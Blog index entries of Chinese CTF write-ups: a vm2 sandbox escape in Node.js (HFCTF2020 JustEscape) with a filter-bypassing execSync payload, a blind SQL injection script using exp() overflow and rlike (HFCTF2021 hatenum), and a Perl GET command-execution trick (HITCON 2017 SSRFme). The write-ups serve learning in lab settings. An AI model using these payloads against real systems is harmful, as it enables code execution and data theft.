        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2020 JustEscape</title>
    <url>/%5BHFCTF2020%5DJustEscape.html</url>
    <content><![CDATA[<h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p>JS的题，又欺负我不会JS，稍微记一下以后入门用</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>因为题目提示这可能不是一个PHP站，所以题目中run.php可能是一个故意设置的路由，简单测试之后发现报错完全不是PHP风格，猜测或为python或js。测着测着突然出现了一句<code>TypeError: Cannot read property &#39;toString&#39; of undefined</code>，js无误了<br>后来看别人的wp，js测试的话可以用Error().stack直接查看报错信息，还能获取更多的信息<br>得到输出</p>
<pre class=" language-javascript"><code class="language-javascript">Error
    at vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span>
    at Script<span class="token punctuation">.</span>runInContext <span class="token punctuation">(</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">131</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">)</span>
    at VM<span class="token punctuation">.</span>run <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>vm2<span class="token operator">/</span>lib<span class="token operator">/</span>main<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">219</span><span class="token punctuation">:</span><span class="token number">62</span><span class="token punctuation">)</span>
    at <span class="token operator">/</span>app<span class="token operator">/</span>server<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">51</span><span class="token punctuation">:</span><span class="token number">33</span>
    at Layer<span class="token punctuation">.</span>handle <span class="token punctuation">[</span><span class="token keyword">as</span> handle_request<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>layer<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">95</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span>
    at next <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>route<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">137</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">)</span>
    at Route<span class="token punctuation">.</span>dispatch <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>route<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">112</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">)</span>
    at Layer<span class="token punctuation">.</span>handle <span class="token punctuation">[</span><span class="token keyword">as</span> handle_request<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>layer<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">95</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span>
    at <span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">281</span><span class="token punctuation">:</span><span class="token number">22</span>
    at Function<span class="token punctuation">.</span>process_params <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>express<span class="token operator">/</span>lib<span class="token operator">/</span>router<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">335</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>
</code></pre>
<p>使用的是vm2这个库，查了一下，就是一个运行不可靠代码的沙盒，有如下逃逸的payload，github上有</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token string">"use strict"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span>VM<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> untrusted <span class="token operator">=</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 TypeError<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>get_process <span class="token operator">=</span> f<span class="token operator">=</span><span class="token operator">></span>f<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">try</span><span class="token punctuation">{</span>
  Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">get_process</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token operator">+</span><span class="token string">')()'</span><span class="token punctuation">;</span>
<span class="token keyword">try</span><span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>untrusted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2 id="js拼接字符串"><a href="#js拼接字符串" class="headerlink" title="js拼接字符串"></a>js拼接字符串</h2><p>（wp上说题目过滤了很多字段，但是我实际上测试的时候输入啥回显都是一样的，看不出来有什么过滤，菜）<br>在引号被过滤的情况下，反引号也可以代替引号<br>js的这个字符串拼接我也是看的云里雾里，大致是`${`x`}y`这个形式，会得到内容为xy的字符串，而单独使用`${x}`则是将x作为一个变量引入，所以通过如上方法对所以被过滤字符串进行拼接，得到一个可绕过的payload</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    TypeError<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`prototyp`</span></span><span class="token punctuation">}</span>e<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`get_pro`</span></span><span class="token punctuation">}</span>cess<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token operator">=</span><span class="token operator">></span>f<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`constructo`</span></span><span class="token punctuation">}</span>r<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`return proc`</span></span><span class="token punctuation">}</span>ess<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">``</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> e<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`get_pro`</span></span><span class="token punctuation">}</span>cess<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`requir`</span></span><span class="token punctuation">}</span>e<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`child_proces`</span></span><span class="token punctuation">}</span>s<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token string">`${`</span></span>$<span class="token punctuation">{</span><span class="token template-string"><span class="token string">`exe`</span></span><span class="token punctuation">}</span>cSync<span class="token template-string"><span class="token string">`}`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`ls /`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>得到如上payload<br>获取根目录flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>JavaScript</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>[HFCTF2021]hatenum</title>
    <url>/%5BHFCTF2021%5Dhatenum.html</url>
    <content><![CDATA[<h1 id="HFCTF2021-hatenum"><a href="#HFCTF2021-hatenum" class="headerlink" title="[HFCTF2021]hatenum"></a>[HFCTF2021]hatenum</h1><p>BUU上的复现，之前做其他题的时候一直在想HFCTF是个啥，合肥CTF？听起来就很不合理，这次这个题是之前队里师傅出的，所以我到这个时候才发现原来是虎符CTF。。。</p>
<p>SQL注入题，但是我作为SQL注入废物，自然是不能很顺畅的做出来</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>代码很简单，登录注册两个功能，admin登录就能拿flag。过滤了一堆东西<code>    preg_match(&#39;/union|select|or|and|\&#39;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#39;, $str))</code>，同时还限制了数字<code>(preg_match(&#39;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#39;,$str))</code>。登录的话，登录成功失败和发生错误是三个不同的回显，所以可以通过触发错误进行盲注，常见操作就是整数溢出注入了，但是这里限制了数字的位数，所以整数溢出似乎也做不到。</p>
<p>这里有两种做法，一个是网上常见的wp的答案，exp函数，上限是exp(709)，再加一就会溢出浮点数上界报错，还有一种是学长的<code>~0+1</code>，对0取反直接拿到最大整数<br>这个取反操作挺玄幻的，可能这里是逐位取反，所以对0取反拿到了无符号最大整数？如果对负数取反的话结果会比较玄幻，感觉负数应该是补码存储的，然后取反同样是逐位翻转（包括符号位）</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~(-1);
+-------+
| ~(-1) |
+-------+
|     0 |
+-------+
1 row in set (0.00 sec)

mysql> select ~1;
+----------------------+
| ~1                   |
+----------------------+
| 18446744073709551614 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551615+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
</code></pre>
<p>接下来我们看一下过滤，禁用了单双引号各种空格符号和星号，但是注释符和反斜杠没有过滤，没了星号就没有行内注释符了，但是还是可以用井号进行单行注释，用反斜杠转义掉引号然后再注释掉下一个引号，就在password处能有一个完全可控的输入点，也能万能密码登录，不过因为登陆之后还有一部验证码校验，万能密码过了验证码也不知道登不进去，需要通过注入把验证码搞出来<br><code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p>
<p>有了注入点之后提取数据的方式，这里过滤掉了select，所以是<strong>不能拿其他表的数据了</strong>，这里我一开始忘了，还以为没select又没堆叠又不是MySQL8就拿不到数据了，还是可以拿到当前表的数据的，所以拿code还是有机会的<br>接下来是字符串获取，但是这个过滤是比较狠的，substr，mid，left之类的还有各种大小于号等号都没了，并且没有引号，也不好比较字符串，只能用0x十六进制的形式来表示字符串，但由于题目的限制，最多只能表示四个字符。regexp这个正则也没了，但是还有一个常用字段LIKE还在，搜了一下，不止是LIKE，还有一个叫RLIKE的字段，LIKE要全部匹配才返回1，而RLIKE和REGEXP则是部分匹配即可返回1，刚好满足我们的只有四个字符的条件</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select 'abcd' like 'a';
+-----------------+
| 'abcd' like 'a' |
+-----------------+
|               0 |
+-----------------+
1 row in set (0.00 sec)

mysql> select 'abcd' rlike 'a';
+------------------+
| 'abcd' rlike 'a' |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)

mysql> select 'abcd' regexp 'a';
+-------------------+
| 'abcd' regexp 'a' |
+-------------------+
|                 1 |
+-------------------+
1 row in set (0.00 sec)
</code></pre>
<p>like是<code>_</code>匹配单个任意字符，<code>%</code>匹配任意数量的字符，rlike和regexp则和标准正则语法比较一致。当然，这里用通配符还会占用更多的字符，所以就硬匹配好了。</p>
<p>先用<code>^</code>确认开头，然后一个字符一个字符的挪<br>但是还是没有这么顺利，因为一次只能匹配四个字符，那么，如果整个字符串中出现三个连续字符的重复片段，那么接下来的一次匹配匹配上的字符就可能是看你charset的顺序了，这里就出现了这样的情况；并且这里需要表里就一条数据，不然这code就不知道匹配到哪去了。<br>先贴一下垃圾脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://37bb2225-a836-4156-8347-f6627b0ef845.node4.buuoj.cn:81/login.php"</span>
payload <span class="token operator">=</span> <span class="token string">"||exp(709+((code)rlike(0x{})))#"</span>
charset <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm_"</span>
<span class="token comment" spellcheck="true"># erghruigh2(3,u)</span>
<span class="token comment" spellcheck="true"># gh23uiu32ig</span>
<span class="token comment" spellcheck="true"># gh2uygh2(3,u)</span>
<span class="token comment" spellcheck="true"># erghruigh2uygh23uiu32ig</span>
result <span class="token operator">=</span> <span class="token string">"67683275"</span>
plain <span class="token operator">=</span> <span class="token string">"gh2u"</span>
<span class="token comment" spellcheck="true"># print(result, end="")</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    finds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    result <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        t <span class="token operator">=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"a\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token operator">+</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true"># print(data)</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"error"</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            finds<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>finds<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>finds<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> finds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        plain <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>finds<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span>
</code></pre>
<p>这里出现了一个分支，在<code>erghruigh2</code>之后有两个可能字符，3和u，跟进3<br>发现抵达了字符串末尾，而跟进u，其结尾又是gh2，其后可能是3可能是u。这里就真没办法了，只能猜这个跟进u的序列重复了多少次，不过只重复了一次，一次就能过了（这段的逻辑我想了好久才想明白怎么处理。。。。幸好重复的只有一个字段）</p>
<p>使用char函数也能拼出来字符串，不过这里禁了逗号，所以也不行</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select char(0x7133);
+--------------+
| char(0x7133) |
+--------------+
| q3           |
+--------------+
1 row in set (0.00 sec)

mysql> select char(71,70);
+-------------+
| char(71,70) |
+-------------+
| GF          |
+-------------+
1 row in set (0.00 sec)
</code></pre>
<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>有一点讲究，mysql似乎会自己判断输入数字的范围然后决定用什么类型的数字去处理他，小一点的就是无符号整数，负数的话会变成有符号整数，超过无符号整数的数字会用更大的数字处理（？），总之越了无符号数的上界之后就没成功溢出报错过了</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select 18446744073709551615+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
mysql> select 18446744073709551616+1;
+------------------------+
| 18446744073709551616+1 |
+------------------------+
|   18446744073709551617 |
+------------------------+
1 row in set (0.00 sec)
</code></pre>
<h2 id="mysql-where子句处理顺序"><a href="#mysql-where子句处理顺序" class="headerlink" title="mysql where子句处理顺序"></a>mysql where子句处理顺序</h2><p>我觉得这个是个很有意思的点，学到了。以前我们都认为mysql的逻辑处理是从左往右的，比如有一个and语句，<code>1=1 and exp(710)</code>，如果1&#x3D;1为真，那么继续and后的exp语句，如果1&#x3D;1为假，那后面的条件肯定是无意义的，就会被直接的忽略掉，但事实真的如此吗？进行简单的实验</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or 1=0 and password=exp(710);
Empty set (0.00 sec)

mysql> select * from users where id=0 or 1=1 and password=exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
mysql> select * from users where id=0 or 1=0 and exp(710);
Empty set (0.00 sec)
</code></pre>
<p>似乎和之前的认知是一致的，and语句中前一句挂了，后一句就不用执行了。但是，如果把1&#x3D;1换成这个题目类型的payload呢？<br>注：这里没有password中有z的密码</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password rlike 'a' and exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
mysql> select * from users where id=0 or password rlike 'z' and exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
</code></pre>
<p>仿佛事情有所转机，那么再来一次</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password rlike 'a' and password=exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
mysql> select * from users where id=0 or password rlike 'z' and password=exp(710);
Empty set (0.00 sec)
</code></pre>
<p>我逐渐相信了他的说法，mysql是会以某种顺序去计算条件的，那个师傅提到最有可能的是先计算全常量的表达式，比如之前的<code>1=1</code>，比如这样</p>
<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id=0 or password=exp(710) and 1=1;
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
mysql> select * from users where id=0 or password=exp(710) and 1=0;
Empty set (0.00 sec)
</code></pre>
<p>把password&#x3D;去掉的话就可能因为都是常量顺序计算都报错了<br>总的来说有点玄幻。。。。用之前先试一下，最好的方法还是做加减而不是靠这种逻辑语句的运算顺序</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://roverdoge.top/archives/204">虎符杯final_hatenum复现</a><br><a href="https://blog.csdn.net/weixin_39842682/article/details/110493301">mysql where条件执行顺序_MySQL复杂where条件分析</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>HITCON 2017 SSRFme</title>
    <url>/%5BHITCON%202017%5DSSRFme.html</url>
    <content><![CDATA[<h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>buu上的一个老题，又是不会做看wp的一天</p>
<p>给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$http_x_headers</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$http_x_headers</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"sandbox/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"GET "</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"dirname"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>remote_addr就是用来创建一个沙盒的，然后用shell_exec执行一个GET命令，escapeshellarg会转义所有引号再在整个参数上加一个引号，防止了命令注入，就是说只能执行GET。<br>这个GET就是一个GET请求，可以使用file协议什么的，通过Perl实现（是我不懂的东西）<br>整体效果就是把GET请求到的东西写入我们对应的沙盒文件夹中。本来想写直接写一个PHP的shell的，但是靶机不能访问外网，并且估计也设置了沙盒中的PHP文件都不能解析之类的限制，而写文件的路径也被控制在了沙盒内，跳目录什么的也不太行</p>
<h2 id="GET的使用"><a href="#GET的使用" class="headerlink" title="GET的使用"></a>GET的使用</h2><p>GET 后面可以直接接目录获取目录信息，就等于ls，还有就是file协议读一些东西啦，可以扫一下根目录看到&#x2F;readflag和&#x2F;flag。flag自然是被设置了权限不能读，要通过执行&#x2F;readflag来读取flag。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>有两种解法，一种是Perl对未知协议出现时会在试图加载对应名称的pm文件，如果我们在自己的服务器上放一个反弹shell脚本然后让他写入本地，再通过错误的协议让他加载，就可以实现getshell，文末链接中附有Perl反弹shell的脚本，但是buu上这个靶机好像不能访问外网，只得作罢</p>
<p>第二种解法是GET在实现时调用open函数的相关漏洞（我没看懂原理），但是利用方式即为file:filename，如果file协议访问的这个filename是cmd|的形式，那么就会执行这个cmd<br>后来出了一个补丁，需要filename存在时才可能执行到open那一步，但是刚好这里我们又可以创建任意名称的文件，从而任意命令执行</p>
